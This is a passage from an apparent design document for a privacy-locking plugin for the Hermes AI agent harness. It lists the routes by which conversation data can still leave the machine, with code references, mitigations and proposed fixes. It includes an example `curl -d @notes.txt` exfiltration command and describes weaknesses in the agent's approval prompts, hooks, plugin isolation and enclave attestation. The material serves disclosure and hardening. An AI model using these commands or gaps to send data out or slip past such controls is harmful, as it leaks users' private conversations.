<!-- PLUGIN_NAME: confidential-mode  (final catalog slug; the prose name is Hermes Confidential Mode) -->
# Hermes Confidential Mode: limitations, as an upstream roadmap

Every gap in this document is a place where a plugin cannot close a route on its own. A "route" here
means a way for your conversation, or data about it, to leave the machine.

Each numbered section says four things:

- **The gap:** what happens.
- **Why it exists:** which part of Hermes, the vendor or the SDK causes it. Line references are to
  Hermes at commit 84a0301 unless the section says otherwise. The seam tests under `tests/` run
  against that commit.
- **What the plugin does today:** the mitigation, or the plain statement that there is none.
- **The change that would close it:** usually a change to Hermes core, sometimes a change on the
  vendor's or the SDK's side.

For Hermes maintainers, the closing changes are the seams the plugin would use.

The last section, "Smaller gaps, disclosed", lists gaps that need no section of their own.

## Terms used here

The [guide's glossary](GUIDE.md#glossary) defines every term. The terms this document relies on most
are repeated here.

**Hermes** is an agent harness: the program that runs the loop around a language model, sends it
your messages, and runs the tools it asks for. A **profile** is a separate Hermes home directory with
its own config and data. A **session** is one conversation.

To **lock** a profile is to hold it to one **tier**, which is a rule about where the model may run.
**On-host** means on the machine that runs Hermes, and **off-host** means anywhere else.
The `on-host-only` tier accepts loopback hosts and the exact hosts listed in
`confidential.on_host.extra_hosts`. The `attested` tier accepts only Tinfoil's verified enclave, or
NEAR AI Cloud's verified gateway and models (section 14). A destination the rule accepts is
"in-tier", and any other is "off-tier". The guide's [tiers chapter](GUIDE.md#tiers) states each rule
in full.

The **preflight** is the check the plugin runs over your config before it locks. It records a
fingerprint of the routing config so that later changes can be detected.

A **hook** is a callback Hermes calls at a named moment. Some hooks can return an instruction that
Hermes obeys. Others can only observe. **Middleware** is code Hermes runs around an operation. It
receives the request and can refuse to pass it on. This plugin uses middleware around main-loop model
calls (`llm_execution`) and around tool calls (`tool_execution`).

An **auxiliary call** is a model call Hermes makes for a side job, such as compressing context,
writing a title, or describing an image. Each side job is an **auxiliary task**.

The **ledger** is the plugin's on-host log of sends, refusals, questions and answers. A **receipt** is
a rendering of the ledger for one session. A **breach** row records an auxiliary call that went
off-tier while locked.

An **enclave** is a virtual machine whose memory the CPU encrypts, so that the host's operator cannot
read it. The general name for this CPU feature is a trusted execution environment (TEE).
**Attestation** is the enclave proving what it runs, through a report signed by the CPU vendor's
hardware. A **measurement** is a hash of the code loaded into the enclave. A **fingerprint** is a
short hash of a measurement. The **platform** is the CPU vendor's TEE technology: AMD SEV-SNP or
Intel TDX.

Tinfoil's **router** is the enclave your requests connect to. A **pin** is your recorded approval of
an enclave build. A Tinfoil pin holds one router build's code fingerprint and enclave fingerprint. A
NEAR pin is a set of approved entries, one for each CVM configuration (section 14).

**Evidence** is the raw bytes captured during one verification. A **replay** re-runs that
verification later, offline, from the evidence.

## 1. Auxiliary calls are not wrapped by `llm_execution`

**The gap.** The plugin cannot refuse an auxiliary call at the moment it is sent. This applies to
compression, title generation, vision, smart-approval classification, MCP helpers, memory query
rewriting and the other auxiliary tasks.

It also applies to two other calls. One is the summary Hermes writes when a turn reaches its maximum
number of iterations (`agent/chat_completion_helpers.py:2225-2273`). The other is the
`codex_app_server` runtime. Both call the provider without the middleware.

**Why it exists.** Auxiliary tasks call providers from `agent/auxiliary_client.py`. That code never
enters `run_llm_execution_middleware` (`hermes_cli/middleware.py:136`). The only caller of that
function is the main loop, at `agent/turn_api_call.py:139`.

Hermes does offer two auxiliary hooks, `pre_auxiliary_call` and `post_auxiliary_call`
(`agent/auxiliary_hooks.py:210-240`). Both are observers. Hermes ignores their return value. If one
of them fails, Hermes logs the failure and carries on.

**What the plugin does today.** The plugin acts at four points.

1. **At lock time.** It refuses to lock unless every auxiliary task resolves in-tier. That covers the
   built-in tasks, 19 at 84a0301, read from `DEFAULT_CONFIG["auxiliary"]`. It also covers every task
   a plugin registers. The plugin refuses `openai-codex` and `moa` as the main provider.
2. **On every locked turn.** It runs the same check again.
3. **On the live runtime.** Tasks set to `auto` follow the live main runtime, not the config. Hermes
   holds that runtime in `agent.auxiliary_client.set_runtime_main`. The plugin therefore classifies
   the live runtime on every locked turn and ends the turn when it is off-tier. On gateway surfaces
   (Telegram, Discord and the other messaging platforms), it also refuses `/model` and `/moa` while
   locked, through the `pre_gateway_dispatch` hook.
4. **At runtime.** It writes a ledger row for every auxiliary attempt. If an attempt goes off-tier
   anyway, it writes a `breach` row and marks the session as breached.

**Where an `auto` side call can go.** A side call whose provider is `auto` resolves to the main model.
Hermes' built-in fall-through then tries OpenRouter and then Nous (`_get_provider_chain`,
`agent/auxiliary_client.py:3080-3088`). OpenRouter is used when Hermes' credential pool holds an
`openrouter` entry or `OPENROUTER_API_KEY` is set (`_try_openrouter`, `:2296`). Nous is used when Hermes
holds Nous authentication from `hermes auth` (`_try_nous`, `:2355`). At 84a0301 Hermes runs that chain for
a text side call only when the main provider is unset or `auto` (`_discovery_chain_allowed`,
`:4529-4541`, called at `:4591` and `:4147`), and for vision only on `auto` (`_vision_auto_route`,
`:5541-5567`). The preflight refuses an unset or `auto` main provider and an `auto` vision route, so under a
lock the fallback chain is refused by the main-provider rule. A side call on `auto` therefore stays
in-tier. While `OPENROUTER_API_KEY` or `NOUS_API_KEY` is readable through Hermes' secret scope, its
preflight row carries a note saying so, and `check` prints one summary line with the number of side
calls on `auto` and the credential that would matter. A credential held only in Hermes' credential pool,
or a Nous sign-in through `hermes auth`, is not checked: the plugin reads no credential store, and
Hermes has no public call that reports a sign-in without refreshing it. `hermes confidential setup` pins every side call anyway.

An auxiliary call can still go off-tier in three situations: between turns after a `/model` switch
on the CLI, in the middle of a turn, and when Hermes skips the per-turn check. The plugin cannot stop
the bytes in any of them.

**The core change that would close it.** Run each auxiliary provider attempt through
`run_llm_execution_middleware`, with the task named in the context (`purpose="aux:<task>"`).
Alternatively, let `pre_auxiliary_call` return `{"action": "block"}`, and have the caller raise an
error instead of sending. The max-iterations summary call needs the same treatment.

### A related case: the per-turn check can be skipped

`pre_llm_call` is a timeout-bounded hook. If it runs longer than `plugins.hook_callback_timeout` (30
seconds by default, `hermes_cli/plugins_dispatch.py:183`), Hermes abandons it, suppresses it for 60
seconds and runs the turn anyway (`:42-52` and `:301-312`). Hermes also skips the hook for agents with
persistence disabled (`agent/turn_context.py:858`). The `llm_execution` gate is never skipped, so the
plugin runs the whole per-turn check there too: the structural preflight recheck, its breach rows and
the live-runtime check, once per turn, sharing one result with the hook. The check runs once even when
both ask at the same time: a gate call that arrives while the hook's check is still running (Hermes
abandoned the hook at its time bound) waits for that result, so the breach rows are written once. A
new lock or another tier within the same turn is checked again. A turn whose hook was skipped still
has every main call refused when that check fails.

What a skipped hook still loses: the veto over the side calls Hermes makes before the first main call
of a turn (turn-start compaction, memory prefetch, title generation), which run and are only recorded,
and the locked note in the model's context. The hook does no network I/O and only the per-turn check,
so on a normal config it ends far inside the timeout. A route that names this machine's own host name
needs a DNS lookup; the hook answers it from the answer cached at the lock or an earlier check, even
an old one, and when nothing is cached (a lock taken by another process) the hook leaves the whole
check to the `llm_execution` gate, which resolves the name before the first main call. In that case
the hook also loses the veto over the side calls above for that turn.

The plugin also guards the timeout itself, in three steps.

1. The preflight includes every `plugins.*` key that governs hooks in the config fingerprint
   (`_PLUGIN_EXECUTION_KEYS` in `confidential_mode/preflight.py`).
2. The preflight refuses to lock if the timeout is more than 0 and less than 5 seconds.
3. If someone edits the timeout after locking, the fingerprint changes. The `llm_execution` gate
   then refuses the main call.

One case remains: a title-generation call can run before the main call in a turn whose hook was
skipped, and such a call is only recorded in the ledger, not refused.

## 2. The CLI approve directive grants on any answer except "deny"

**The gap.** A `pre_tool_call` hook can return `{"action": "approve"}`, which asks Hermes to put the
tool call in front of the user. On the CLI, Hermes then grants the call for any answer that is not
the exact string `"deny"`. `None`, an empty string, `"d"`, `"Deny"` and `"yes"` all run the tool.

The hook cannot veto the call after the prompt. The prompt's header is hard-coded as "DANGEROUS
COMMAND".

The gap has a second part: under yolo mode, `approvals.mode: off`, and the cron, unattended
and single-query approval modes, Hermes approves the call without asking anyone. In those modes it
also does not fire the hook (`tools/approval.py:1071-1113`).

**Why it exists.** The grant logic is at `tools/approval.py:1006-1010`, where the code ends with
`return grant(choice)`. Any value that reaches that line is a grant.

**What the plugin does today.** The plugin splits asking from enforcing.

1. The `pre_tool_call` hook only asks. It returns the approve directive, and Hermes shows the
   prompt.
2. The `post_approval_response` hook records the exact answer for that tool call id.
3. The `tool_execution` middleware runs the tool only if the recorded answer is exactly `once`,
   `session` or `always`. It also runs the tool if Hermes holds a remembered grant under the
   plugin's own rule key, `plugin_rule:confidential-mode:tool:<name>`.
4. Any other answer is refused and written to the ledger as `unexpected_choice`.

In the bypass modes listed above, the plugin blocks the tool instead of asking.

`session` and `always` are real grants. Hermes stores an `always` grant in its `command_allowlist`
as `plugin_rule:confidential-mode:tool:<name>`. That grant stops the asking for the tool, across
locks, until you revoke the grant with `/confidential revoke <tool>`.

**The core change that would close it.** Grant only on an explicit allow choice, and treat `None`,
empty and unknown values as deny. Let a plugin's approve directive carry its own header text. Fire
`pre_tool_call`, or a dedicated hook, before a bypass auto-approves a call, so that a policy plugin
can block it.

## 3. Shell and code-execution tools are not inspected

**The gap.** On Hermes' `local` terminal backend, `terminal`, `process_manage` and `execute_code`
run on this host, and they can open any network connection. A command such as `curl -d @notes.txt https://...` sends a file off the machine.

**Why it exists.** Hermes gives a plugin the command string. It does not tell the plugin what the
command will connect to. Guessing from command text is unreliable.

**What the plugin does today.** It classifies these tools as on-host and lets them run. The closing
paragraph of every receipt says that shell and code tools are not covered.

The terminal backend decides where these tools run. It is set by `terminal.backend` in `config.yaml`,
or by the `TERMINAL_ENV` environment variable when the config does not set it. On `ssh`, `modal`,
`managed_modal`, `daytona`, `vercel_sandbox`, `docker` or a plugin backend, these three tools run in
a container or on another machine. So do `read_file`, `write_file`, `patch` and `search_files`. These
seven are the terminal-backend tools. The preflight refuses to lock unless `terminal.backend` and
the backend Hermes resolves for the profile are both `local`, and its row names the backend it found
and the key to change. The plugin resolves the backend the way Hermes' tools do. On a gateway that
serves several profiles, that is the profile's own terminal scope, not the process environment. The
lock is also refused while Hermes holds a cached terminal environment on a non-local backend. The
tool gate checks again on each call to one of the seven tools: the resolved backend and the
environment cached for the call's task must both be `local`, or the call is blocked.

One window remains: Hermes can create a new environment for a task between the plugin's per-call
check and the tool's own start, if the backend changed in that instant. The next call is then
blocked, because the cached environment is no longer local. Only that one call runs on the other
backend.

A three-mode rule is reserved in the code but not shipped (`gate_tools.MODE_TOOLS`). The three modes
would be: ask on commands that look like network access, allow all, or block.

**The core change that would close it.** A network policy on the terminal backend that a plugin can
read and require. One example is the docker backend with networking off, exposed through
`terminal.backend` and `terminal.docker_network`. Locked mode could then accept that contained
backend as well as `local`, and refuse every other one, instead of guessing from command text.

## 4. MCP command servers are not inspected

**The gap.** MCP (the Model Context Protocol) is a standard way to plug external tool servers into
an agent. An MCP server configured with `command:` runs as a child process on this host. That process can
itself be a network client, or a proxy to a hosted service.

**Why it exists.** Hermes does not tell plugins what network access an MCP server has.

**What the plugin does today.** It allows tools from command servers. This is the same class of gap
as the terminal.

It treats servers configured with a `url:` differently. It blocks their tools when the URL's host is
off-tier. It re-reads the server config at call time, so a server that someone re-points after the
lock is judged again.

**The core change that would close it.** A declared network capability for each MCP server, visible
to plugins. A sandboxed launcher with networking off would also work.

## 5. Safe-worker mode disables hooks and middleware

**The gap.** Safe-worker mode is a mode for managed Hermes worker processes in which Hermes
deliberately loads no plugins. Locked mode does not apply inside a safe worker.

**Why it exists.** In a safe worker, Hermes never discovers plugins (`hermes_cli/plugins.py:1206-1208`).
Hook dispatch returns nothing (`hermes_cli/plugins_dispatch.py:285-288`). `has_hook` returns false
(`hermes_cli/plugins_dispatch.py:561-564`). Middleware runs through the same plugin manager, so it does
not run either.

**What the plugin does today.** Nothing. A plugin that is not loaded can do nothing. The gap is
disclosed, not mitigated.

**The core change that would close it.** Persist a "locked" flag for each profile that Hermes core can
see, and make safe workers honour it. A safe worker could then refuse off-tier routes, or refuse to run
on a locked profile at all. This would not depend on plugin code being loaded.

## 6. The trust boundary is the whole Hermes process

**The gap.** Other plugins in the same process share the Python interpreter with this plugin. They can
register their own middleware or a provider, read this plugin's `ctx.state`, and patch anything.

A policy plugin cannot require a particular order of middleware between plugins.

**Why it exists.** Hermes loads plugins into its own process by default. It offers an alternative,
`plugins.isolation: host`, which runs plugins in a separate child process. Under host isolation,
however, this plugin's provider and middleware register in that child process. They are then invisible
to Hermes, and Hermes gives no warning.

**What the plugin does today.** It refuses to lock unless isolation is `in_process` and the attested
provider is visible in the process. At lock time it records each tool's handler, and it blocks any
tool whose handler later changes. That is all a plugin can do against another plugin.

**The core change that would close it.** Three changes together.

- A policy tier for middleware that always runs outermost.
- A way for a profile to say "only these plugins load while locked".
- A `ctx.register_provider_profile` that works under host isolation. Today the plugin has to call
  `providers.register_provider` directly.

## 7. The vendor measurement covers the router, not the model

**The gap.** Tinfoil's attestation covers the `tinfoilsh/confidential-model-router` enclave that the
client talks to. The pin does not cover which model backend the router forwards to, or how it does so.

A second effect follows from how the router is measured. Routers on AMD SEV-SNP hosts and on Intel TDX
hosts report different kinds of measurement. Their enclave fingerprints therefore differ for the same
release.

When no router is configured, router discovery picks one router at random, once per process. A restart
can therefore land on the other platform. The plugin then refuses with "enclave build changed" until
you approve again.

**Why it exists.** This is how Tinfoil's attestation is built. It is not a Hermes gap.

**What the plugin does today.** It states the gap in every receipt. It offers two ways to stop the
platform switching.

- Set `confidential.tinfoil.enclave` to one router host. The plugin then always uses that router.
- Set `confidential.pins.auto_approve_platform_only: true`. The plugin then applies a new pin without
  asking when you already have a pin, the code fingerprint is unchanged, and the SDK's signed
  hardware-measurements check passed. In tinfoil 0.14.2 that check runs only for TDX, so only a switch
  to a TDX router is approved this way.

**The change that would close it.** None in Hermes. On the vendor's side: per-model attestation that
the client can check.

## 8. No nonce, no attested time

**The gap.** The attestation report commits to the enclave's TLS and HPKE keys, not to any request. It
carries no client nonce. (A nonce is a random value the client sends so that the reply is provably
fresh.) `verified_at` is this machine's clock.

**Why it exists.** The report format and the SDK define what is signed.

The release tag is bound. The SDK's Sigstore policy requires the signing workflow to have run at
`refs/tags/<tag>` (tinfoil 0.14.2, `sigstore.py:164-172`).

What nothing signs is which release the vendor called "latest". The SDK asks the GitHub proxy for that
answer (`github.py:50`), and the answer is not signed.

**What the plugin does today.** It labels every time "(host clock)". The offline replay returns a
fixed `NOT_ESTABLISHED` list with every result. That list names the missing nonce, the unsigned
"latest" answer, and the fact that the capture time comes from the evidence itself. The plugin makes
no freshness claim beyond "verified at host-clock time T".

**The change that would close it.** None in Hermes. On the vendor's side: a client nonce in the report,
and signed responses.

## 9. What the network still sees, and what the receipt leaks

**The gap.** Even with every route above closed, the following remain.

- **Where TLS ends, and what is visible anyway.** TLS is the encryption HTTPS uses. The plugin
  drives the tinfoil SDK in its `ehbp` transport mode. In that mode the SDK encrypts each request
  body to the enclave's attested HPKE key and builds the TLS connection under it as ordinary WebPKI
  TLS (tinfoil 0.14.2, `tinfoil/client.py:728-736` and `:806`; only the SDK's `tls` mode pins). The
  plugin pins the connection instead: every Tinfoil inference connection, for a send or a request
  without a body, gets an SSL context that checks the peer certificate's key against the TLS key of
  the verified report the plugin accepted (never a newer report the SDK holds before the plugin has
  checked its build and pins), inside the handshake and before any request byte (headers and the
  `Authorization` header included) is written. The same holds for the transports the SDK rebuilds after a key rotation. A certificate
  with another key closes the connection, fails the request, writes a `verify_fail` row
  (`reason_code: tls_pin_mismatch`) and asks for a re-verification, at most once per 30 seconds. A TLS
  intermediary that the WebPKI accepts therefore can no longer read the headers or the API key; the
  connection is refused instead.

  Before each verification is accepted, the plugin's TLS probe (`confidential.tinfoil.tls_probe`)
  opens one bodiless connection without the API key, pinned to the key of the report being verified,
  and records the certificate the router presented, for the evidence; the replay's
  `tls_cert_binding` check re-reads that certificate. A certificate with another key fails the
  verification with a `verify_fail` row (purpose `tls_pin`), so the lock is refused. The pin on
  inference connections is what enforces for sends.

  Not pinned, by design: the SDK's own attestation fetch to the router, the collateral proxies
  (`*.tinfoil.sh`), `atc.tinfoil.sh`, GitHub, Sigstore's TUF CDN and Intel Trust Authority. They use
  ordinary WebPKI TLS, carry no API key, and what they return is checked by its signatures. On NEAR
  the attestation report fetch is not pinned either, for the same reason.

  On NEAR the plugin pins TLS the same way: every inference and signature connection is checked against
  the certificate the gateway's quote binds, before any request byte is sent (section 14).

  Whatever ends TLS, any network hop and the vendor's hosting still see your IP address, the sizes of
  requests and responses, and their timing.
- **The collateral proxies.** Collateral is the certificates and signed documents a client needs from
  the CPU vendor to check a hardware report. The SDK fetches collateral and release data through three
  proxies that Tinfoil runs: `github-proxy.tinfoil.sh`, `kds-proxy.tinfoil.sh` and
  `tdx-proxy.tinfoil.sh`. They see each verification, from your IP address. They also serve the bytes
  the verifier checks.

  The checks are signature checks. A proxy that lies therefore causes a refusal, not a false pass.
- **DNS.** Your resolver looks up every host above.
- **The ledger.** The ledger is a metadata trail: hosts, sizes, times and tool names. A shared receipt
  shares that trail.
- **The host operator.** Whoever operates the machine Hermes runs on sees every prompt before any of
  this applies. That includes a cloud agent host or a VPS provider.

**Why it exists.** These are properties of the network, of the vendor's service and of where Hermes
runs. None of them is a Hermes seam.

**What the plugin does today.** Nothing beyond saying so. Receipts never contain prompt text.

**The change that would close it.** None in Hermes for the network items. For the host operator, the
answer is to run Hermes on a machine you control. Running Hermes itself in an enclave would also work,
but it is out of scope here.

## 10. Start-up model-list probe on a drifted runtime

**The gap.** Suppose the live runtime has been switched to a hosted provider, for example by a session
`/model` on the CLI. When the agent starts, Hermes lists that provider's models. It sends
`GET .../models` with your API key, on its default transport, before any plugin seam runs
(`agent/model_metadata.py:898` and `:1026`).

No conversation text is sent, and the plugin refuses the turn that follows, but the probe request has gone out by then.

The test `tests/hostile/test_integrated_hostile.py::test_leak_live_off_tier_runtime_hits_hermes_default_transport`
marks this as a disclosed Hermes gap. It is marked as an expected failure (xfail).

**Why it exists.** Hermes gives plugins no seam before this request.

**What the plugin does today.** It refuses the turn and records the drift in the ledger. It cannot stop
the probe.

**The core change that would close it.** Let a provider profile or a hook veto metadata requests. An
alternative is to send them through the profile's own client.

## 11. Context-length probes bypassed the attested transport (mitigated in-plugin)

**The gap.** When Hermes builds an agent, it resolves the model's context window
(`agent/agent_init.py:1883-1884`). If the provider profile does not answer, Hermes probes
`GET {base_url}/models` and `POST /api/show`. It does so with plain httpx and your API key, outside the
attested transport.

**Why it exists.** Hermes treats the profile's answer as optional and falls back to the network probe.

**What the plugin does today.** The `attested-tinfoil` profile answers `get_model_context_length` with
the value of `confidential.tinfoil.context_length`. The `attested-near` profile answers with
`confidential.near.context_length`. Both default to 65536. Because the profile answers, the probe
never runs.

Set the value for the model you use. [config.example.yaml](config.example.yaml) lists the windows
Tinfoil documents.

**The core change that would close it.** Send metadata probes through the profile's own client.
Alternatively, skip them for any profile that implements `create_client`.

## 12. SDK caches outside the plugin's data (mitigated in-plugin)

**The gap.** tinfoil 0.14.2 and sigstore-python keep caches under the default platform directories.
Those are `~/Library/Caches/tinfoil` on macOS, `~/.cache/tinfoil` on Linux, and sigstore-python's TUF
directories. (TUF, The Update Framework, is how sigstore-python downloads and refreshes its trust
root.)

**Why it exists.** Both libraries compute those paths at import time. This is not a Hermes gap.

**What the plugin does today.** It re-points the caches under its own data directory before the first
verification. [DISCLOSURE.md](DISCLOSURE.md) gives the details.

A process that used the SDK before the plugin's first verification may already have written to the
default paths.

**The change that would close it.** None in Hermes. On the SDK's side: a cache-directory parameter.

## 13. No mixed "attested or on-host" tier (planned)

**The gap.** A lock is one tier. You cannot run the main model attested and send cheap side jobs, such
as titles and compression, to an on-host model.

**Why it exists.** The `on-host-only` rule refuses the enclave, and the `attested` rule refuses the
on-host host (`confidential_mode/tiers.py`). This is a limit of the plugin, not of Hermes.

One consequence concerns vision on NEAR: images sent to NEAR leave in plaintext to its gateway
(section 14). A user who wants images to stay on this host would choose an on-host vision model, and
only a mixed tier would accept it.

**Plan.** A tier inside the plugin whose rule accepts any destination that either existing rule
accepts. The attested checks would stay unchanged for attested routes. No core change is needed.

## 14. NEAR AI Cloud: what the signatures and the evidence leave open

NEAR AI Cloud is the second attested vendor, under the provider name `attested-near`. Its
**gateway** is the server at `cloud-api.near.ai` that takes your request and passes it to a model. The
gateway and each NEAR-operated model run in Intel TDX virtual machines, which NEAR calls CVMs. A
**signed response** is a signature NEAR returns for one completion. A `provider_tee` signature is made
inside the model's CVM over `<model id>:<SHA-256 of the request body>:<SHA-256 of the response body>`.
A `gateway` signature is made inside the gateway's CVM over `<request hash>:<response hash>` only.

**The gap.** Eleven things stay open after every NEAR check passes.

- **The gateway reads every image.** NEAR's encryption covers text only. An image part leaves this
  host in plaintext, so NEAR's gateway, and anything the gateway forwards it to, can read the image.
  A model signature over the request covers the image bytes, but does not keep the gateway from
  reading them.

- **A gateway signature says nothing about the model.** The gateway signs its own output whenever it
  rewrites the bytes: on every streamed completion, when it resolves a model alias, and on the
  Responses API. NEAR documents no link from that signature to the response the model produced.
- **A model signature is not chained to the gateway.** NEAR documents that a `provider_tee` signature
  does not bind the model-signed bytes to the gateway evidence or to the TLS connection.
- **The instance is not named.** Every instance of one model shares one signing key, also across
  instances with different measured configurations. On 2026-11-07 NEAR served Qwen/Qwen3.8-27B from at
  least two instances whose measured docker-compose files differ, in an instance label and in a
  compose-manager image digest.
- **What runs after launch is not measured here.** The model CVM's docker-compose starts a service
  called compose-manager. Compose-manager deploys further services after launch, from docker-compose
  files in NEAR's public repository. NEAR returns a separate attestation for compose-manager: a log of
  its deployment actions, with an Intel TDX quote. A TD (trust domain) is Intel's name for one TDX
  virtual machine. The plugin checks that attestation, and a pass establishes three things. A TD of this
  instance reported this actions log for this nonce. The log's hash is bound in a hardware quote. The per-service
  deployment map the plugin derives from the log is what the operator's own tooling reported. A pass
  does not establish that the docker-compose files deployed after launch are measured, or that the
  reported services are the ones running. Two facts stand in the way.
  - The log reports a compose-manager other than the measured one. The measured docker-compose names
    one compose-manager image. The measured docker-compose also starts a launcher service that can
    replace that image after boot.
    On 2026-11-07 the log of every instance the plugin saw recorded such a replacement. The log is the
    operator's report, so the plugin cannot confirm which compose-manager image runs.
  - The deployed services hold the quote socket. The model proxies that compose-manager deploys run as
    root and privileged, with the dstack socket (`/var/run/dstack.sock`) mounted. Any program that holds
    that socket can get a quote of this TD over report data it chooses. Such a program could produce a
    log that passes every check.
- **The model CVM's patch level is not checked.** The plugin checks each model quote's signature
  chain to Intel's SGX root offline. It does not fetch Intel's TCB collateral for it, so the model CVM's
  TCB status, advisories and revocation are unknown. Only the gateway's TCB status is known, from
  Intel Trust Authority's signed token.
- **The GPU verdict is not tied to the model CVM.** Intel Trust Authority's "model provider" token
  carries an NVIDIA GPU verdict next to TDX claims that are the gateway's own. Nothing in that token
  names the model CVM.
- **The gateway still reads part of each request.** TLS ends inside the gateway's CVM, which then reads
  the request to route it. With request encryption on (`confidential.near.encrypt`, the default), the
  message text, tool definitions and tool calls reach the gateway as ciphertext. The gateway still reads
  the model id, the plaintext parameters (for example `max_tokens`, `stop`, `response_format`, `user`
  and `metadata`), the sizes and the timing. The gateway also reads the request headers. These are the
  `Authorization` header with the API key, `User-Agent`, the OpenAI SDK's `x-stainless-*` headers (SDK
  version, operating system, Python version), `content-type`, the encryption headers (the client and
  model public keys) and any extra headers Hermes adds. With encryption off the gateway reads the whole
  request. The attestation says which code the gateway runs. The attestation does not say what that
  code does with what the gateway reads.
- **The gateway can read a reply, and is caught only afterwards.** The model encrypts its reply to the key
  in the `X-Client-Pub-Key` request header. NEAR's signature does not cover that header. A gateway that
  puts its own key there can read the reply. If it forwards the reply unchanged, the reply does not
  decrypt for the plugin. If it re-encrypts the reply to the plugin's key, the signed response digest no
  longer matches. Either way the plugin withholds the reply and records the send as unverified. By then
  the gateway has read the reply, and any part of the request the model repeated in it.
- **Encryption names a key, not an instance.** The plugin encrypts each request to the model key that it
  verified in the attestation report. Every instance of that model shares that key, approved or not, so
  the encryption does not establish that only an approved instance could read the request.
- **"Encrypted" is the plugin's own report.** The ledger and the receipt say which fields left as
  ciphertext. A third party can check the signature, and the signature covers the digests of the
  ciphertext. Nobody but this host saw the plaintext, so nobody else can confirm that it was encrypted.

**Why it exists.** These are properties of NEAR's protocol as NEAR documents it (docs.near.ai,
verification pages, read 2026-11-07). They are not Hermes gaps.

**What the plugin does today.**

- It refuses a NEAR model that is not on `confidential.near.models` before sending, while
  `require_provider_tee` is true (the default). Models NEAR does not attest run in what NEAR calls
  Incognito mode, with gateway signatures only. A request for one could reach a hosted provider behind
  the gateway, such as Anthropic or OpenAI.
- It sends main calls unstreamed, so that a NEAR-operated model can sign them with `provider_tee`.
  The setting is `confidential.near.streaming`, default false. While encryption is on, the plugin
  refuses a streamed request before it is sent, whatever that setting says.
- It encrypts every chat request to the verified model key before it leaves this host (NEAR's
  encryption, version 2, with all fields on). It refuses the attested-tier lock while
  `confidential.near.encrypt` is false, while an attested-near route sets an `api_mode` other than chat
  completions, or while the `pynacl` package is missing. Before sending, it refuses any POST other
  than chat completions and any top-level request key that would carry text in plaintext.
- It sends image parts in plaintext beside the encrypted text, by default
  (`confidential.near.image_parts: disclose`). Every text part of such a message (`text` or
  `input_text`, in any letter case) is encrypted. An `image_url` or `input_image` part that holds an
  inline raster `data:image/...;base64,` image (png, jpeg, gif, webp, bmp or tiff) leaves this host
  in plaintext to NEAR's gateway. Any other part type, a remote image URL, or an extra field on an
  image part is refused before sending. On 2026-11-07 NEAR accepted this shape and still returned a
  `provider_tee` signature. Each send's ledger row counts the plaintext parts by type, and the receipt says how many
  left. The first time per lock, the plugin writes a `notice` row and, once the row is written, appends
  one line naming the part types to that session's next reply through Hermes' `transform_llm_output`
  hook. A send with no session id puts the line on the next reply of any session, and a send made by a
  delegated subagent puts it on the subagent's reply, which goes to the parent model. That hook keeps the first non-empty rewrite, so
  another plugin that rewrites the same reply can displace the line. The ledger row and the receipt
  stay either way. With `confidential.near.image_parts: refuse`, the plugin refuses a message with any
  non-text part before it is sent.
- It checks the TLS certificate of every inference and signature connection right after the
  handshake, before any request byte is sent. The certificate's key must be the key the gateway's
  quote binds. A send over any other certificate is refused.
- It records every send's digests and signature in a `send_signed` ledger row. A send without a
  `provider_tee` signature that verifies is marked unverified, and the receipt says "SESSION NOT FULLY
  ATTESTED". With encryption on, the reply of such a send never reaches the agent: the plugin decrypts
  a reply only after a verified `provider_tee` signature over the encrypted bytes. Only an HTTP 200
  reply that verifies and decrypts is handed over; any other status is refused. While the profile is
  locked, any error on a main call ends the turn (GUIDE.md, "What happens while locked"). While it is
  unlocked, Hermes retries only a rate limit (429), a server error (5xx), a context-length error
  (which it first compresses), and a timeout or a reset. A reply that fails its checks, an HTTP 421
  and every other refusal are not resent. Each attempt is a new encrypted request and gets its own
  ledger row. With encryption off, a send without a verified signature is recorded as unverified but
  not refused, because the response has already arrived when the signature is fetched.
- An HTTP 421 means the gateway no longer accepts the model key. A send that meets a TLS certificate
  other than the attested one is treated the same way. The plugin then verifies again, at most once
  per `confidential.near.reverify_backoff_seconds` (default 30), and refuses NEAR sends until that
  verification passes.
- The model key is not part of a pin. The review bundle shows the verified signing address, old and
  new, for the reviewer. Within one Hermes process, a re-verification that reports a different model
  key is refused, so when NEAR rotates a model key, NEAR requests are refused until Hermes restarts.
  The restart accepts the new key without a prompt.
- Settings whose value is a mapping, such as `extra_body` entries, leave this host in plaintext. While
  encryption is on, the plugin lets three structured settings pass, each checked by shape, and refuses
  every other such setting before the request is sent:
  - `reasoning`, a mapping with only these keys: `enabled` (true or false), `effort` (null or one of
    `none`, `minimal`, `low`, `medium`, `high`, `xhigh`, `max`), `summary` (one of `auto`, `concise`,
    `detailed`, `none`), `max_tokens` (an integer) and `exclude` (true or false). On auxiliary calls
    such as title generation, Hermes sends `reasoning: {"enabled": true, "effort": ...}` or
    `{"enabled": false}` on chat completions, and `{"effort": ..., "summary": "auto"}` elsewhere.
  - `stream_options`, a mapping with only `include_usage` (true or false).
  - `reasoning_effort`, one of the same effort words.

  These settings carry no free text: every key is fixed, and every value is a boolean, an integer or a
  word from a fixed list, and the integer `max_tokens` must lie between 0 and 2^31 - 1. Any other key,
  or a word outside the list, is refused. `logit_bias`, every other `extra_body` entry, and any other
  top-level list or mapping, even one of numbers only, are still refused, because token ids could
  encode text. The gateway reads the
  structured settings, and the `send_signed` row names them in `plaintext_keys`.
- Every NEAR refusal is recorded. A request the plugin refuses before sending, or a reply it withholds
  after receiving, gets a `send_refused` row with the purpose (`main` or `aux:<task>`), the host, the
  reason and the request size when the plugin knows the size. The receipt lists the row under Refusals.
  For a main call while locked, the LLM gate writes that row. For any other call, such as an
  auxiliary task, the NEAR transport writes the row. When the provider's own check refuses an
  auxiliary call before the transport runs, for example because no pin matches, the attested client
  writes the row, with the stage `provider_gate`. Tinfoil calls refused at that check get the same row.
- It pins each CVM it saw as an entry of its own: the gateway, and each model instance. An entry pins
  the CVM's measured docker-compose, its app_id, OS image and KMS key as RTMR3 records them, and its
  firmware and kernel measurements. A model entry also pins the compose-manager image the log reports
  and the whole service map (below).
  The approved entries form a set. A verification passes when every CVM it reports matches an
  approved entry, so a new instance with another configuration is a pin prompt. Approving adds to the
  set. An entry no verification has matched for 20 verifications is flagged, and `hermes confidential
  pins retire` removes it. The set only grows unless you retire entries, so an instance NEAR stopped
  running stays approved until you do.
- The plugin checks the compose-manager attestation of every model report it accepts. While
  `require_provider_tee` is true, a report without one is refused. The pin prompt shows what that
  attestation reported, under a heading that says the report is not a measurement. The plugin records
  every service in the log, with the release each one was deployed from. The prompt lists first the
